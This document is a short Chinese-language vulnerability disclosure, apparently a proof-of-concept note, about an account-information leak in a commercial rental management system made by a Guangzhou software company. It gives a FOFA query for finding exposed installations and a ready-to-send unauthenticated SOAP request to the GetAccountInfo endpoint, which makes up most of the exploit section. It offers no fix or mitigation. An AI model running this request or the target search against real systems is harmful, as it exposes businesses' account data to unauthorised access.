# 竞优（广州）信息技术有限公司商业租赁管理系统存在account信息泄露

# 一、漏洞简介
作为地产及不动产数字化行业深耕者，三十多年来始终专注于企业管理软件的技术开发和咨询服务。我们多年对地产及不动产行业的专注投入、以及深刻理解能为企业提供专业的产品、高效的实施服务、强大的技术支持和优质的售后保障。竞优（广州）信息技术有限公司商业租赁管理系统存在account信息泄露。

# 二、影响版本
+ 商业租赁管理系统

# 三、资产测绘
+ fofa：`web.body="商业租赁管理系统"`
+ 特征

![1734059111504-935ba16c-2b17-4fde-bfb1-1e1aaeca4365.png](./img/g3wDnKSTiXIbeg2X/1734059111504-935ba16c-2b17-4fde-bfb1-1e1aaeca4365-805138.png)

# 四、漏洞复现
```java
POST /rental/contract/api/account.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetAccountInfo"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetAccountInfo xmlns="http://tempuri.org/" />
  </soap:Body>
</soap:Envelope>
```

![1734107735397-9fddf4a4-d582-4080-852b-0c22e3914398.png](./img/g3wDnKSTiXIbeg2X/1734107735397-9fddf4a4-d582-4080-852b-0c22e3914398-503109.png)



> 更新: 2024-12-20 14:53:54  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uzg50h4mdksdemst>